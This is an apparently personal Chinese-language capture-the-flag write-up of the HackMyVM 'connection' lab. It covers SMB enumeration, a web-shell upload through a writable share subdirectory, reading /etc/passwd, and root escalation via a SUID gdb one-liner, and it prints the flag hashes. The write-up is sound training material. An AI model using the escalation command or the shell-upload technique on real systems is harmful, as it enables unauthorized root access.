---
title: connection
author: hgbe02
date: 2024-03-24
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/connection.html"
---

# connection

之前和`pwned`一起做的，都扫不到，尝试一下一样的做法：

`ro`改为`;rw signie init=/bin/bash`  

```apl
rw读写 signie单用户 命令权限/bin/bash
```

> 实际上单用户模式是 single 而非 signie。

然后`ctrl+x`进入单用户模式

```bash
vim /etc/network/interfaces
```

修改网卡文件，都改为跟上面一样的网卡

```bash
/etc/init.d/networking restart
```

没用，需要key，尝试扫一下：

我换一个`wifi`而不是校园网，好像就扫出来了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106333.png" alt="image-20240318000858653" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106335.png" alt="image-20240318001155350" style="zoom: 50%;" />

坏事，不是这哥们，重新ping一下：

```bash
┌──(kali㉿kali)-[~]
└─$ fping -aqg 192.168.0.0/24
192.168.0.1
192.168.0.113
192.168.0.126
```

没找到，估计又不在一个子网下，这网配的稀巴烂。

重新尝试，发现网上的写错了；

```bash
rw signie init=/bin/bash  # 千万前面别无中生有加个；这里其实写错了单用户模式是single而非signie
ctrl+x
vi /etc/network/interfaces
/etc/init.d/networking restart
```

![image-20240318002212530](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106336.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106337.png" alt="image-20240318002347964" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106338.png" alt="image-20240318002445576" style="zoom:33%;" />

发现可以扫到了！！！！、

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106339.png" alt="image-20240318002511383" style="zoom:50%;" />



## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.0.176 -- -A -sV
```

```text
Open 192.168.0.176:22
Open 192.168.0.176:139
Open 192.168.0.176:445
Open 192.168.0.176:80
```

```text
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxNh+4rTxFF/c8dZwGAg+SIl5zJE1Rq8y3vlHZ2P7gTdRQDb7XlWK8W5O0XVtBVqWlvLZlHIOniUJlSlcps51cHo58B9KczrZME5phRmiYLOo2pTBmra6sZADq7mmlHkpz1LbpmgzSGchrrp9pSxUjcdmpffhgd79i/q0d4ya7vK4R/tcegMNUxjkmW83JCu0Mc2qw3JvzqCQ5BGyrgGrsb4VguV/MZrPzX8nwM7i2ivsg+d171360aa9SXtoGELkBfeqCOKRCOckw2gfQlo2tsdc26jwimBygMPpkAH87zMJdl5iEX7p9tPr4ddIp9DtPjsSB3Cu2ObOr9iAYVvy5
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHVs0JAs/3OsoWURkn+P6KrjxC1zzMry+q3H+RX+UW05NQvD3NORKjL0gnr+LOumhE1cMGmCgMTcaJ41T5nbxM=
|   256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9EVXAcxAJmQLNl3ttKL8QEWy+X+0R/rmS0tyt/bd2t
80/tcp  open  http        syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb2-time: 
|   date: 2024-03-17T16:28:47
|_  start_date: N/A
| nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   CONNECTION<00>       Flags: <unique><active>
|   CONNECTION<03>       Flags: <unique><active>
|   CONNECTION<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61342/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 25410/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58819/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48870/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2024-03-17T12:28:47-04:00
```

### 目录扫描

看一下`80`端口：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106340.png" alt="image-20240318003511573" style="zoom:50%;" />

```bash
/icons/               (Status: 403) [Size: 278]
/server-status/       (Status: 403) [Size: 278]
```

### SMB服务枚举

`139`、`445`开溜SMB服务，看一下：

```bash
smbmap -H 192.168.0.176
```

```text
[+] IP: 192.168.0.176:445       Name: connection                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        share                                                   READ ONLY
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Private Share for uploading files)
```

存在`share`文件夹，但是只读。

## 漏洞利用

进去看一下:

```bash
# smbclient -N \\192.168.0.176\share 需要对反斜杠进行转义
smbclient -N \\\\192.168.0.176\\share
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106341.png" alt="image-20240318005211823" style="zoom:50%;" />

传来一个shell上去！！！（它本身只读不代表它的子目录也只读！）

访问激活shell！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106342.png" alt="image-20240318005306123" style="zoom:50%;" />

## 提权

### 扩展shell

```bash'
python -c 'import pty;pty.spawn("/bin/bash")'
```

### 查看基础信息

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106343.png" alt="image-20240318005659772" style="zoom:50%;" />

```bash
www-data@connection:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
connection:x:1000:1000:connection,,,:/home/connection:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```

等下，发现`gdb`有suid，这倒是第一回见，查看一下有无利用的方法：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403180106344.png" alt="image-20240318010006183" style="zoom:50%;" />

阔以！改一下，利用一下。

```bash
gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
```

提取到了`root`，获取一下flag：

```bash
www-data@connection:/$ gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
# <t os; os.execl("/bin/bash", "bash", "-p")' -ex quit
# GNU gdb (Debian 8.2.1-2+b3) 8.2.1
# Copyright (C) 2018 Free Software Foundation, Inc.
# License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
# This is free software: you are free to change and redistribute it.
# There is NO WARRANTY, to the extent permitted by law.
# Type "show copying" and "show warranty" for details.
# This GDB was configured as "x86_64-linux-gnu".
# Type "show configuration" for configuration details.
# For bug reporting instructions, please see:
# <http://www.gnu.org/software/gdb/bugs/>.
# Find the GDB manual and other documentation resources online at:
#     <http://www.gnu.org/software/gdb/documentation/>.

# For help, type "help".
# Type "apropos word" to search for commands related to "word".
bash-5.0# whoami;id
whoami;id
# root
# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-5.0# cd /root
# cd /root
bash-5.0# ls -la
# ls -la
# total 24
# drwx------  3 root root 4096 Sep 22  2020 .
# drwxr-xr-x 18 root root 4096 Sep 22  2020 ..
# lrwxrwxrwx  1 root root    9 Sep 22  2020 .bash_history -> /dev/null
# -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
# drwxr-xr-x  3 root root 4096 Sep 22  2020 .local
# lrwxrwxrwx  1 root root    9 Sep 22  2020 .mysql_history -> /dev/null
# -rw-r--r--  1 root root  148 Aug 17  2015 .profile
# -rwx------  1 root root   33 Sep 22  2020 proof.txt
bash-5.0# cat proof.txt
# cat proof.txt
# a7c6ea4931ab86fb54c5400204474a39
bash-5.0# cd /home
# cd /home
bash-5.0# ls -la
# ls -la
# total 12
# drwxr-xr-x  3 root       root       4096 Sep 22  2020 .
# drwxr-xr-x 18 root       root       4096 Sep 22  2020 ..
# drwxr-xr-x  3 connection connection 4096 Sep 22  2020 connection
bash-5.0# cd connection 
# cd connection
bash-5.0# ls -la
# ls -la
# total 28
# drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .
# drwxr-xr-x 3 root       root       4096 Sep 22  2020 ..
# lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .bash_history -> /dev/null
# -rw-r--r-- 1 connection connection  220 Sep 22  2020 .bash_logout
# -rw-r--r-- 1 connection connection 3526 Sep 22  2020 .bashrc
# drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .local
# lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .mysql_history -> /dev/null
# -rw-r--r-- 1 connection connection  807 Sep 22  2020 .profile
# -rw-r--r-- 1 connection connection   33 Sep 22  2020 local.txt
bash-5.0# cat local.txt
cat local.txt
# 3f491443a2a6aa82bc86a3cda8c39617
```

长见识了，gdb提权！！！

